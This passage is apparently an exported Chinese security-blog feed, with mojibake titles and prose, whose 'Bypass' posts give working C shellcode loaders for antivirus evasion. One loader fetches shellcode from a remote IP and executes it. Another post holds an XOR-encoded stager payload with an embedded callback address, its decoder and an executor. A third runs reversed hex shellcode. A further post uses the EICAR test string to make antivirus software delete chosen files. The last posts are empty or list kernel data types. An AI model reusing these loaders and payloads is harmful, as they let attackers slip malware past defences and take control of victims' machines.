    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;WinInet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;WinInet.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> * <span class="title function_">GetUrlPage</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *URL, <span class="type">const</span> <span class="type">char</span> *SubPath)</span></span><br><span class="line">&#123;</span><br><span class="line">	HINTERNET hInternet, hConnect, hRequest = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwOpenRequestFlags, dwRet = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *pResponseHeaderIInfo = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwResponseHeaderIInfoSize = <span class="number">2048</span>;</span><br><span class="line">	BYTE *pBuf = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD dwBufSize = <span class="number">64</span> * <span class="number">2048</span>;</span><br><span class="line"></span><br><span class="line">	hInternet = InternetOpenA(<span class="string">&quot;WinInetGet/0.1&quot;</span>, INTERNET_OPEN_TYPE_PRECONFIG, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">	hConnect = InternetConnectA(hInternet, URL, INTERNET_DEFAULT_HTTP_PORT, <span class="number">0</span>, <span class="number">0</span>, INTERNET_SERVICE_HTTP, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == hConnect)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	dwOpenRequestFlags = INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_KEEP_CONNECTION |</span><br><span class="line">		INTERNET_FLAG_NO_AUTH | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD;</span><br><span class="line"></span><br><span class="line">	hRequest = HttpOpenRequestA(hConnect, <span class="string">&quot;GET&quot;</span>, SubPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, dwOpenRequestFlags, <span class="number">0</span>);</span><br><span class="line">	HttpSendRequest(hRequest, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	pResponseHeaderIInfo = new <span class="type">unsigned</span> <span class="type">char</span>[dwResponseHeaderIInfoSize];</span><br><span class="line">	RtlZeroMemory(pResponseHeaderIInfo, dwResponseHeaderIInfoSize);</span><br><span class="line">	HttpQueryInfo(hRequest, HTTP_QUERY_RAW_HEADERS_CRLF, pResponseHeaderIInfo, &amp;dwResponseHeaderIInfoSize, <span class="literal">NULL</span>);</span><br><span class="line">	pBuf = new BYTE[dwBufSize];</span><br><span class="line"></span><br><span class="line">	RtlZeroMemory(pBuf, dwBufSize);</span><br><span class="line">	InternetReadFile(hRequest, pBuf, dwBufSize, &amp;dwRet);</span><br><span class="line">	<span class="keyword">return</span> (<span class="type">char</span> *)pBuf;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> *shellcode = GetUrlPage(<span class="string">&quot;ipåœ°å€&quot;</span>, <span class="string">&quot;/shellcodeæ–‡ä»¶è·¯å¾„&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s \n&quot;</span>, shellcode);</span><br><span class="line">	<span class="type">int</span> shellcode_length = <span class="built_in">strlen</span>(shellcode);</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>* value = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">calloc</span>(shellcode_length / <span class="number">2</span>, <span class="keyword">sizeof</span>(<span class="type">unsigned</span> <span class="type">char</span>));</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">size_t</span> count = <span class="number">0</span>; count &lt; shellcode_length / <span class="number">2</span>; count++) &#123;</span><br><span class="line">		sscanf_s(shellcode, <span class="string">&quot;%2hhx&quot;</span>, &amp;value[count]);</span><br><span class="line">		shellcode += <span class="number">2</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">void</span> *exec = VirtualAlloc(<span class="number">0</span>, shellcode_length / <span class="number">2</span>, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(exec, value, shellcode_length / <span class="number">2</span>);</span><br><span class="line">	((<span class="type">void</span>(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>Shellcodeå¼‚æˆ–</title>
    <url>/posts/346bf539/</url>
    <content><![CDATA[<p>é€šè¿‡ shellcode å˜å½¢æ©ç›–å…¶ç‰¹å¾ä»¥ç»•è¿‡é™æ€æŸ¥æ€</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//shellcode xorencode</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x44\x6f\x67\x43\x73\x44\x6f\x67\x43\x73\x2e\x6a\x73\x00\xce\x32\x3f\xe1\xbc\x7e\xdf\x16\xc5\xec\xd3\x08\xa5\xa9\xfd\xe8\x0c\x62\x21\x9e\x58\x71\xdb\xc4\x1c\xb5\xb7\x6a\x51\x66\x5b\x16\x92\xe3\x50\x3e\xb9\x43\x9e\xab\xc4\xa6\x36\x6c\x68\xaa\x2a\x9c\xe8\xcd\x32\xc3\x22\x78\x77\x17\xb0\xb6\xae\x7d\x2c\xbb\x0c\x04\x0e\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x29\x0d\x0a\x00\x99\xc4\xdc\xc9\x44\xd2\x8a\xbf\x32\xa7\x06\x20\x29\x57\x58\x03\x21\xae\xab\x53\x2b\x60\xe6\x68\xcd\xcb\xc0\xee\x23\xb5\x0b\xa0\xa7\xf0\x61\xec\x55\x34\x3e\x5c\xaa\xe3\x9f\xb0\x6c\xa8\xd3\x05\xfd\xb4\x9b\xad\xed\x36\x4b\xee\x9d\xec\xfa\x18\x6d\xf1\x33\xc7\x88\x3a\x64\x77\x98\x98\x26\x89\xcb\xa9\x51\x39\xe8\x50\xa5\xba\xaf\xe4\x9b\x2f\x51\x99\x44\xac\x5f\xcf\xbc\x8a\xac\x06\xa7\x59\x1a\xf4\xfd\xc7\x34\xe7\xdc\xd0\xd6\x38\x64\x53\xbc\xea\x6e\x75\xcc\x87\x50\x99\xee\x5a\xaa\x10\xf0\x75\x16\x75\xe5\x80\x10\xe3\xb6\x7f\xe6\x2f\xc5\xcb\x5c\x2c\x6b\xbb\xb4\x73\x90\x9e\x4a\x7f\xef\x8a\xe0\x51\x25\x71\x00\x14\xdd\x20\x6d\xda\x86\x08\xef\x90\x83\x32\x76\xb5\xf4\xcc\xdd\x4f\x0d\x7e\xb2\xb9\xbb\x9d\x62\x2b\xc7\xfe\xf8\xdb\xe3\x57\x6c\x1a\xe8\x36\x08\x82\x97\xd2\xde\x3e\x53\x38\xb5\xb1\x19\xb3\x83\xe9\x39\xce\x06\xd5\x8f\x5b\x56\xc3\xdf\xa4\xfa\xda\xc8\xcf\x31\x63\x5b\x03\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x38\x31\x2e\x31\x00\x05\xf5\xe1\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> key1 = <span class="number">50</span>;</span><br><span class="line">	<span class="type">int</span> key2 = <span class="number">66</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> enShellCode[<span class="number">892</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> deShellCode[<span class="number">892</span>];</span><br><span class="line">	<span class="type">int</span> nLen = <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">	&#123;  </span><br><span class="line">		enShellCode[i] = buf[i] ^ key1;</span><br><span class="line">		enShellCode[i] = buf[i] ^ key2;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, enShellCode[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------\n&quot;</span>);  </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nLen; i++)</span><br><span class="line">	&#123;    </span><br><span class="line">		deShellCode[i] = enShellCode[i] ^ key1;</span><br><span class="line">		deShellCode[i] = enShellCode[i] ^ key2;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\\x%02x&quot;</span>, deShellCode[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span>Â  <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xbe\xaa\xcb\x42\x42\x42\x22\xcb\xa7\x73\x90\x26\xc9\x10\x72\xc9\x10\x4e\xc9\x10\x56\xc9\x30\x6a\x4d\xf5\x08\x64\x73\xbd\x73\x82\xee\x7e\x23\x3e\x40\x6e\x62\x83\x8d\x4f\x43\x85\xa0\xb2\x10\x15\xc9\x10\x52\xc9\x00\x7e\x43\x92\xc9\x02\x3a\xc7\x82\x36\x08\x43\x92\x12\xc9\x0a\x5a\xc9\x1a\x62\x43\x91\xa1\x7e\x0b\xc9\x76\xc9\x43\x94\x73\xbd\x73\x82\xee\x83\x8d\x4f\x43\x85\x7a\xa2\x37\xb6\x41\x3f\xba\x79\x3f\x66\x37\xa0\x1a\xc9\x1a\x66\x43\x91\x24\xc9\x4e\x09\xc9\x1a\x5e\x43\x91\xc9\x46\xc9\x43\x92\xcb\x06\x66\x66\x19\x19\x23\x1b\x18\x13\xbd\xa2\x1a\x1d\x18\xc9\x50\xa9\xc4\x1f\x2a\x2c\x27\x36\x42\x2a\x35\x2b\x2c\x2b\x16\x2a\x0e\x35\x64\x45\xbd\x97\x73\xbd\x15\x15\x15\x15\x15\x2a\x78\x14\x3b\xe5\xbd\x97\xab\xc6\x42\x42\x42\x19\x73\x8b\x13\x13\x28\x41\x13\x13\x2a\x12\x42\x42\x42\x11\x12\x2a\x15\xcb\xdd\x84\xbd\x97\xa9\x32\x19\x73\x90\x10\x2a\x42\x40\x02\xc6\x10\x10\x10\x11\x10\x12\x2a\xa9\x17\x6c\x79\xbd\x97\xcb\x84\xc1\x81\x12\x73\xbd\x15\x15\x28\xbd\x11\x14\x2a\x6f\x44\x5a\x39\xbd\x97\xc7\x82\x4d\xc6\x81\x43\x42\x42\x73\xbd\xc7\xb4\x36\x46\xcb\xbb\xa9\x4b\x2a\xe8\x87\xa0\x1f\xbd\x97\xcb\x83\x2a\x07\x63\x1c\x73\xbd\x97\x73\xbd\x15\x28\x45\x13\x14\x12\x2a\xf5\x15\xa2\x49\xbd\x97\xfd\x42\x6d\x42\x42\x7b\x85\x36\xf5\x73\xbd\xab\xd3\x43\x42\x42\xab\x8b\x43\x42\x42\xaa\xc9\xbd\xbd\xbd\x06\x2d\x25\x01\x31\x06\x2d\x25\x01\x31\x6c\x28\x31\x42\x8c\x70\x7d\xa3\xfe\x3c\x9d\x54\x87\xae\x91\x4a\xe7\xeb\xbf\xaa\x4e\x20\x63\xdc\x1a\x33\x99\x86\x5e\xf7\xf5\x28\x13\x24\x19\x54\xd0\xa1\x12\x7c\xfb\x01\xdc\xe9\x86\xe4\x74\x2e\x2a\xe8\x68\xde\xaa\x8f\x70\x81\x60\x3a\x35\x55\xf2\xf4\xec\x3f\x6e\xf9\x4e\x46\x4c\x42\x17\x31\x27\x30\x6f\x03\x25\x27\x2c\x36\x78\x62\x0f\x2d\x38\x2b\x2e\x2e\x23\x6d\x77\x6c\x72\x62\x6a\x21\x2d\x2f\x32\x23\x36\x2b\x20\x2e\x27\x79\x62\x0f\x11\x0b\x07\x62\x7b\x6c\x72\x79\x62\x15\x2b\x2c\x26\x2d\x35\x31\x62\x0c\x16\x62\x74\x6c\x73\x79\x62\x15\x0d\x15\x74\x76\x79\x62\x16\x30\x2b\x26\x27\x2c\x36\x6d\x77\x6c\x72\x6b\x4f\x48\x42\xdb\x86\x9e\x8b\x06\x90\xc8\xfd\x70\xe5\x44\x62\x6b\x15\x1a\x41\x63\xec\xe9\x11\x69\x22\xa4\x2a\x8f\x89\x82\xac\x61\xf7\x49\xe2\xe5\xb2\x23\xae\x17\x76\x7c\x1e\xe8\xa1\xdd\xf2\x2e\xea\x91\x47\xbf\xf6\xd9\xef\xaf\x74\x09\xac\xdf\xae\xb8\x5a\x2f\xb3\x71\x85\xca\x78\x26\x35\xda\xda\x64\xcb\x89\xeb\x13\x7b\xaa\x12\xe7\xf8\xed\xa6\xd9\x6d\x13\xdb\x06\xee\x1d\x8d\xfe\xc8\xee\x44\xe5\x1b\x58\xb6\xbf\x85\x76\xa5\x9e\x92\x94\x7a\x26\x11\xfe\xa8\x2c\x37\x8e\xc5\x12\xdb\xac\x18\xe8\x52\xb2\x37\x54\x37\xa7\xc2\x52\xa1\xf4\x3d\xa4\x6d\x87\x89\x1e\x6e\x29\xf9\xf6\x31\xd2\xdc\x08\x3d\xad\xc8\xa2\x13\x67\x33\x42\x56\x9f\x62\x2f\x98\xc4\x4a\xad\xd2\xc1\x70\x34\xf7\xb6\x8e\x9f\x0d\x4f\x3c\xf0\xfb\xf9\xdf\x20\x69\x85\xbc\xba\x99\xa1\x15\x2e\x58\xaa\x74\x4a\xc0\xd5\x90\x9c\x7c\x11\x7a\xf7\xf3\x5b\xf1\xc1\xab\x7b\x8c\x44\x97\xcd\x19\x14\x81\x9d\xe6\xb8\x98\x8a\x8d\x73\x21\x19\x41\x42\x2a\xb2\xf7\xe0\x14\xbd\x97\x28\x02\x2a\x42\x52\x42\x42\x2a\x42\x42\x02\x42\x15\x2a\x1a\xe6\x11\xa7\xbd\x97\xd1\xfb\x42\x42\x42\x42\x43\x9b\x13\x11\xcb\xa5\x15\x2a\x42\x62\x42\x42\x11\x14\x2a\x50\xd4\xcb\xa0\xbd\x97\xc7\x82\x36\x84\xc9\x45\x43\x81\xc7\x82\x37\xa7\x1a\x81\xaa\xeb\xbf\xbd\xbd\x73\x7b\x70\x6c\x73\x74\x7a\x6c\x73\x7a\x73\x6c\x73\x42\x47\xb7\xa3\x42&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="number">892</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¿›è¡Œå¼‚æˆ–</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> len = <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line">    buf[i] ^= <span class="number">66</span>;</span><br><span class="line">    shellcode[i] = buf[i];</span><br><span class="line">    <span class="comment">//printf(&quot;\\x%02x&quot;, shellcode[i]);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  DWORD temp;</span><br><span class="line">  <span class="comment">//ä½¿ç”¨VirtualProtect ä¿®æ”¹å†…å­˜é¡µçš„å±æ€§ æ”¹ä¸ºå¯æ‰§è¡Œæƒé™</span></span><br><span class="line">  VirtualProtect(shellcode, <span class="keyword">sizeof</span> shellcode, PAGE_EXECUTE, &amp;temp);</span><br><span class="line">  ((<span class="type">void</span>(*)())shellcode)();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>Shellcodeåè½¬</title>
    <url>/posts/e42a1137/</url>
    <content><![CDATA[<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996);</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;	</span><br><span class="line">	</span><br><span class="line">	<span class="type">char</span> *str = <span class="string">&quot;shellcode&quot;</span>;  </span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> char_in_hex;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> iterations = <span class="built_in">strlen</span>(str);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> memory_allocation = <span class="built_in">strlen</span>(str) / <span class="number">2</span>;</span><br><span class="line">	  </span><br><span class="line">	<span class="type">char</span>* temp = (<span class="type">char</span>*)VirtualAlloc(<span class="number">0</span>, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line">	</span><br><span class="line">	<span class="type">int</span> p = <span class="number">0</span>;  </span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="built_in">strlen</span>(str) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">	&#123;</span><br><span class="line">		temp[p++] = str[i];</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* shellcode = (<span class="type">char</span>*)temp;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; iterations - <span class="number">1</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">sscanf</span>(shellcode + <span class="number">2</span> * i, <span class="string">&quot;%2X&quot;</span>, &amp;char_in_hex);</span><br><span class="line">		shellcode[i] = (<span class="type">char</span>)char_in_hex;  </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">	<span class="type">void</span>* exec = VirtualAlloc(<span class="number">0</span>, memory_allocation, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memcpy</span>(exec, shellcode, memory_allocation);</span><br><span class="line">	  </span><br><span class="line">	(*(<span class="type">void</span>(*WINAPI)()) exec)();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>æ€è½¯æ‹¦æˆªè§„åˆ™</title>
    <url>/posts/59de0ce9/</url>
    <content><![CDATA[<h4 id="æ€è½¯æ‹¦æˆªè§„åˆ™"><a href="#æ€è½¯æ‹¦æˆªè§„åˆ™" class="headerlink" title="æ€è½¯æ‹¦æˆªè§„åˆ™"></a>æ€è½¯æ‹¦æˆªè§„åˆ™</h4><p><img src="/posts/59de0ce9/1.png"></p>
<h4 id="åˆ©ç”¨æ€è½¯è§„åˆ™åˆ é™¤ä»»æ„æ–‡ä»¶"><a href="#åˆ©ç”¨æ€è½¯è§„åˆ™åˆ é™¤ä»»æ„æ–‡ä»¶" class="headerlink" title="åˆ©ç”¨æ€è½¯è§„åˆ™åˆ é™¤ä»»æ„æ–‡ä»¶"></a>åˆ©ç”¨æ€è½¯è§„åˆ™åˆ é™¤ä»»æ„æ–‡ä»¶</h4><p><code>X5O!P%@AP[4\PZX54(P^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*</code></p>
<p><strong>EICAR æ ‡å‡†åç—…æ¯’æµ‹è¯•æ–‡ä»¶</strong>ï¼Œåˆç§°<strong>EICAR æµ‹è¯•æ–‡ä»¶</strong>, æ˜¯ç”±<a href="https://zh.wikipedia.org/wiki/%E6%AC%A7%E6%B4%B2%E5%8F%8D%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E5%8D%8F%E4%BC%9A">æ¬§æ´²åè®¡ç®—æœºç—…æ¯’åä¼š</a>ï¼ˆEICARï¼‰ä¸<a href="https://zh.wikipedia.org/w/index.php?title=%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%97%85%E6%AF%92%E7%A0%94%E7%A9%B6%E7%BB%84%E7%BB%87&action=edit&redlink=1">è®¡ç®—æœºç—…æ¯’ç ”ç©¶ç»„ç»‡</a>ï¼ˆCAROï¼‰ç ”åˆ¶çš„æ–‡ä»¶, ç”¨ä»¥æµ‹è¯•<a href="https://zh.wikipedia.org/wiki/%E6%9D%80%E6%AF%92%E8%BD%AF%E4%BB%B6">æ€æ¯’è½¯ä»¶</a>çš„å“åº”ç¨‹åº¦ã€‚ä¸åŒäºä½¿ç”¨å¯èƒ½é€ æˆå®é™…ç ´ç¯çš„å®ä½“æ¶æ„è½¯ä»¶ï¼Œè¯¥æ–‡ä»¶å…è®¸äººä»¬åœ¨æ²¡æœ‰è®¡ç®—æœºç—…æ¯’çš„æƒ…å†µä¸‹æµ‹è¯•æ€æ¯’è½¯ä»¶ã€‚ï¼Œå¹¶ä¸æ˜¯çœŸæ­£çš„ç—…æ¯’ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æ€æ¯’è½¯ä»¶ã€‚</p>
<p><code>echo X5O!P%@AP[4\PZX54(P^^)7CC)7&#125;$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*  &gt; &lt;FILENAME&gt;</code></p>
<p>æ€æ¯’è½¯ä»¶åœ¨è¿è¡Œæ—¶è€ƒè™‘åˆ°å†…å­˜å ç”¨å¯èƒ½ä¸ä¼šåŠ è½½è‡ªå·±çš„å…¨éƒ¨ dll, é‚£ä¹ˆå°†è¿™ä¸ªæµ‹è¯•ä»£ç å†™åˆ°æƒ³è¦å»åˆ é™¤çš„æ–‡ä»¶æ—¶ï¼Œå½“ç”¨åˆ°è¿™ä¸ª dll åæ€è½¯å°±ä¼šæŸ¥æ€åˆ°è¯¥æ–‡ä»¶ä¸ºæ¶æ„æ–‡ä»¶è¿›è¡Œåˆ é™¤ï¼Œæ­¤æ—¶è¯¥è°ƒç”¨çš„ dll å°±ä¼šå¤±æ•ˆã€‚</p>
<p>åœ¨æµ‹è¯•ä¸‹ï¼Œç«ç»’ã€å¡å·´æ–¯åŸºä¼šç›´æ¥å°†å«æœ‰è¯¥æµ‹è¯•ä»£ç çš„æ–‡ä»¶ç›´æ¥éš”ç¦»åˆ é™¤ï¼Œ360ã€Windef ä¼šè¯¢é—®æ˜¯å¦åˆ é™¤ã€‚</p>
<p><img src="/posts/59de0ce9/2.png"></p>
]]></content>
      <categories>
        <category>Bypass</category>
      </categories>
      <tags>
        <tag>Bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>é©±åŠ¨-4-64ä½å†…æ ¸æŒ‚é’©</title>
    <url>/posts/8f299aa4/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>é©±åŠ¨-3-32ä½å†…æ ¸æŒ‚é’©</title>
    <url>/posts/62289487/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>é©±åŠ¨-2_å†…æ ¸ç¼–ç¨‹åŸºç¡€</title>
    <url>/posts/dc4ad149/</url>
    <content><![CDATA[<h4 id="å†…æ ¸APIå‚è€ƒæ–‡æ¡£"><a href="#å†…æ ¸APIå‚è€ƒæ–‡æ¡£" class="headerlink" title="å†…æ ¸APIå‚è€ƒæ–‡æ¡£"></a>å†…æ ¸APIå‚è€ƒæ–‡æ¡£</h4><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/_kernel/">https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/_kernel/</a></p>
<h4 id="åŸºæœ¬æ•°æ®ç±»å‹"><a href="#åŸºæœ¬æ•°æ®ç±»å‹" class="headerlink" title="åŸºæœ¬æ•°æ®ç±»å‹"></a>åŸºæœ¬æ•°æ®ç±»å‹</h4><p>åœ¨å†…æ ¸ç¼–ç¨‹æ—¶éµå®ˆWDKç¼–ç ä¹ æƒ¯</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ULONG(<span class="type">unsigned</span> <span class="type">long</span>)		PULONG(<span class="type">unsigned</span> <span class="type">long</span>*)</span><br><span class="line">UCHAR(<span class="type">unsigned</span> <span class="type">char</span>)		PUCHAR(<span class="type">unsigned</span> <span class="type">char</span>*)</span><br><span class="line">UINT(<span class="type">unsigned</span> <span class="type">int</span>)			PUINT(<span class="type">unsigned</span> <span class="type">int</span>*)</span><br><span class="line">VOID(<span class="type">void</span>)					PVOID(<span class="type">void</span>*)</span><br></pre></td></tr></table></figure>

